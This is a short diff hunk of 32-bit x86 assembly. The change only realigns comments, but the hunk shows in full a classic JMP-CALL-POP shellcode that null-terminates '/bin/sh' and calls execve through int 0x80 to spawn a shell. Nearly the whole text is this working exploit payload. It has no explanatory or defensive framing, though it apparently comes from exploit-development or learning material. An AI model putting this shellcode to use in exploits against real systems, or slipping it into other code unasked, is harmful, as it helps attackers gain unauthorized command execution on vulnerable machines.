@@ -11,13 +11,13 @@ _start:
 	jmp short call_main
 
 main:
-	pop ebx					; EBX = "/bin/shA"
-	xor eax, eax 			; EAX = 0
+	pop ebx			; EBX = "/bin/shA"
+	xor eax, eax 		; EAX = 0
 	mov [ebx+7], byte al	; EBX = "/bin/sh\x00"
-	mov ecx, eax			; ECX = 0
-	mov edx, eax			; EDX = 0
-	mov al, 0xb				; EAX = 0xB (SYS_EXECVE)
-	int 0x80				; SYS_EXECVE
+	mov ecx, eax		; ECX = 0
+	mov edx, eax		; EDX = 0
+	mov al, 0xb		; EAX = 0xB (SYS_EXECVE)
+	int 0x80		; SYS_EXECVE
 
 call_main:
 	call main
